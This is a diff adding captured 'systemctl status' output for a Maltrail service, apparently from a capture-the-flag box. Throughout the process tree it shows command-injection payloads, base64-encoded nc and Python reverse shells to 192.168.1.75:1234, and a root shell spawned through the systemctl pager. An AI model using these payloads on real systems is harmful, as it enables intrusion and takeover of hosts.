@@ -1,0 +1,76 @@
+[0;1;32m●[0m trail.service - Maltrail. Server of malicious traffic detection system
+     Loaded: loaded (/etc/systemd/system/trail.service; disabled; vendor preset: enabled)
+     Active: [0;1;32mactive (running)[0m since Sat 2023-04-15 08:46:37 UTC; 18min ago
+       Docs: https://github.com/stamparm/maltrail#readme
+             https://github.com/stamparm/maltrail/wiki
+   Main PID: 28702 (python3)
+      Tasks: 63 (limit: 1131)
+     Memory: 33.4M
+     CGroup: /system.slice/trail.service
+             ├─28702 /usr/bin/python3 server.py
+             ├─28716 /bin/sh -c logger -p auth.info -t "maltrail[28702]" "Failed password for ;`echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguMS43NSAxMjM0ID4vdG1wL2YK | base64 -d | bash` from 127.0.0.1 port 40678"
+             ├─28717 /bin/sh -c logger -p auth.info -t "maltrail[28702]" "Failed password for ;`echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguMS43NSAxMjM0ID4vdG1wL2YK | base64 -d | bash` from 127.0.0.1 port 40678"
+             ├─28720 bash
+             ├─28723 cat /tmp/f
+             ├─28724 sh -i
+             ├─28725 nc 192.168.1.75 1234
+             ├─28755 bash
+             ├─28761 sh
+             ├─28769 /bin/sh -c logger -p auth.info -t "maltrail[28702]" "Failed password for ;`echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguMS43NSAxMjM0ID4vdG1wL2YK | base64 -d | bash` from 127.0.0.1 port 38102"
+             ├─28770 /bin/sh -c logger -p auth.info -t "maltrail[28702]" "Failed password for ;`echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguMS43NSAxMjM0ID4vdG1wL2YK | base64 -d | bash` from 127.0.0.1 port 38102"
+             ├─28773 bash
+             ├─28776 cat /tmp/f
+             ├─28777 sh -i
+             ├─28778 nc 192.168.1.75 1234
+             ├─28793 /bin/bash
+             ├─28826 /bin/sh -c logger -p auth.info -t "maltrail[28702]" "Failed password for ;`echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguMS43NSAxMjM0ID4vdG1wL2YK | base64 -d | bash` from 127.0.0.1 port 35054"
+             ├─28827 /bin/sh -c logger -p auth.info -t "maltrail[28702]" "Failed password for ;`echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguMS43NSAxMjM0ID4vdG1wL2YK | base64 -d | bash` from 127.0.0.1 port 35054"
+             ├─28830 bash
+             ├─28833 cat /tmp/f
+             ├─28834 sh -i
+             ├─28835 nc 192.168.1.75 1234
+             ├─29342 bash
+             ├─29357 sh
+             ├─29360 bash
+             ├─29378 /bin/sh -c logger -p auth.info -t "maltrail[28702]" "Failed password for ;`echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguMS43NSAxMjM0ID4vdG1wL2YK | base64 -d | bash` from 127.0.0.1 port 38764"
+             ├─29379 /bin/sh -c logger -p auth.info -t "maltrail[28702]" "Failed password for ;`echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguMS43NSAxMjM0ID4vdG1wL2YK | base64 -d | bash` from 127.0.0.1 port 38764"
+             ├─29382 bash
+             ├─29385 cat /tmp/f
+             ├─29386 sh -i
+             ├─29387 nc 192.168.1.75 1234
+             ├─29499 /bin/sh -c logger -p auth.info -t "maltrail[28702]" "Failed password for ;`echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguMS43NSAxMjM0ID4vdG1wL2YK | base64 -d | bash` from 127.0.0.1 port 42186"
+             ├─29500 /bin/sh -c logger -p auth.info -t "maltrail[28702]" "Failed password for ;`echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguMS43NSAxMjM0ID4vdG1wL2YK | base64 -d | bash` from 127.0.0.1 port 42186"
+             ├─29503 bash
+             ├─29506 cat /tmp/f
+             ├─29507 sh -i
+             ├─29508 nc 192.168.1.75 1234
+             ├─29585 /bin/sh -c logger -p auth.info -t "maltrail[28702]" "Failed password for ;`echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguMS43NSAxMjM0ID4vdG1wL2YK | base64 -d | bash` from 127.0.0.1 port 46100"
+             ├─29586 /bin/sh -c logger -p auth.info -t "maltrail[28702]" "Failed password for ;`echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguMS43NSAxMjM0ID4vdG1wL2YK | base64 -d | bash` from 127.0.0.1 port 46100"
+             ├─29589 bash
+             ├─29592 cat /tmp/f
+             ├─29593 sh -i
+             ├─29594 nc 192.168.1.75 1234
+             ├─29744 /bin/sh -c logger -p auth.info -t "maltrail[28702]" "Failed password for ;`echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTkyLjE2OC4xLjc1IiwxMjM0KSk7W29zLmR1cDIocy5maWxlbm8oKSxmKWZvciBmIGluKDAsMSwyKV07cHR5LnNwYXduKCJzaCIpJw== | base64 -d | bash` from 127.0.0.1 port 59174"
+             ├─29745 /bin/sh -c logger -p auth.info -t "maltrail[28702]" "Failed password for ;`echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTkyLjE2OC4xLjc1IiwxMjM0KSk7W29zLmR1cDIocy5maWxlbm8oKSxmKWZvciBmIGluKDAsMSwyKV07cHR5LnNwYXduKCJzaCIpJw== | base64 -d | bash` from 127.0.0.1 port 59174"
+             ├─29748 bash
+             ├─29749 python3 -c import os,pty,socket;s=socket.socket();s.connect(("192.168.1.75",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
+             ├─29750 sh
+             ├─29791 sudo /usr/bin/systemctl status trail.service
+             ├─29792 /usr/bin/systemctl status trail.service
+             ├─29793 pager
+             ├─29798 sh -c /bin/bash
+             ├─29799 /bin/bash
+             ├─29810 sudo /usr/bin/systemctl status trail.service
+             ├─29812 /usr/bin/systemctl status trail.service
+             └─29816 pager
+
+Apr 15 09:02:07 sau sudo[29602]: [0;1;31m[0;1;39m[0;1;31mpam_unix(sudo:auth): conversation failed[0m
+Apr 15 09:02:07 sau sudo[29602]: [0;1;31m[0;1;39m[0;1;31mpam_unix(sudo:auth): auth could not identify password for [puma][0m
+Apr 15 09:02:07 sau sudo[29602]: [0;1;31m[0;1;39m[0;1;31m    puma : command not allowed ; TTY=unknown ; PWD=/opt/maltrail ; USER=root ; COMMAND=/usr/bin/less /usr/bin/systemctl status trail.service[0m
+Apr 15 09:03:10 sau maltrail[29685]: Failed password for ; from 127.0.0.1 port 48072
+Apr 15 09:03:26 sau maltrail[29701]: Failed password for ; from 127.0.0.1 port 43178
+Apr 15 09:04:12 sau sudo[29751]: [0;1;39m[0;1;31m[0;1;39m    puma : TTY=pts/2 ; PWD=/opt/maltrail ; USER=root ; COMMAND=list[0m
+Apr 15 09:04:57 sau sudo[29791]: [0;1;39m[0;1;31m[0;1;39m    puma : TTY=pts/2 ; PWD=/opt/maltrail ; USER=root ; COMMAND=/usr/bin/systemctl status trail.service[0m
+Apr 15 09:04:57 sau sudo[29791]: pam_unix(sudo:session): session opened for user root by (uid=0)
+Apr 15 09:05:04 sau sudo[29810]: [0;1;39m[0;1;31m[0;1;39m    root : TTY=pts/2 ; PWD=/opt/maltrail ; USER=root ; COMMAND=/usr/bin/systemctl status trail.service[0m
+Apr 15 09:05:04 sau sudo[29810]: pam_unix(sudo:session): session opened for user root by (uid=0)
